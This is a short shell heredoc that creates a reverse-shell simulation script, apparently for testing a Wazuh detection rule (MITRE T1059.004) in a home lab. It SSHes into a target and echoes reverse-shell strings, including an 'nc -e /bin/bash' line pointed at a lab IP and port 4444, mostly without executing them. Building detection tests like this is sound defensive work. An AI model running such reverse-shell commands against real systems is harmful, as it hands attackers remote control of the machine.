cat > scripts/attacks/reverse_shell.sh << 'EOF'
#!/bin/bash
# Attack: Reverse Shell Simulation
# MITRE: T1059.004
# Wazuh Rule: 100004
# Run from: Host PC (connects to target via SSH)

TARGET_IP="${1:-192.168.8.130}"
TARGET_USER="${2:-ubuntu}"
SSH_KEY="${3:-$HOME/.ssh/ansible_wazuh_key}"

echo "[+] Simulating reverse shell commands on $TARGET_IP"
echo "[+] MITRE T1059.004 | Expected Wazuh Rule: 100004 (Level 9)"

ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "$TARGET_USER@$TARGET_IP" '
    echo "nc -e /bin/bash 192.168.8.129 4444" > /dev/null 2>&1 || true
    echo "/bin/bash -i" > /dev/null 2>&1 || true
    python3 -c "import socket; print(reverse-shell-test)" 2>/dev/null || true
    echo "ruby -rsocket -e exit" 2>/dev/null || true
'

echo "[+] Done. Check Wazuh dashboard: rule.id:100004"
EOF
chmod +x scripts/attacks/reverse_shell.sh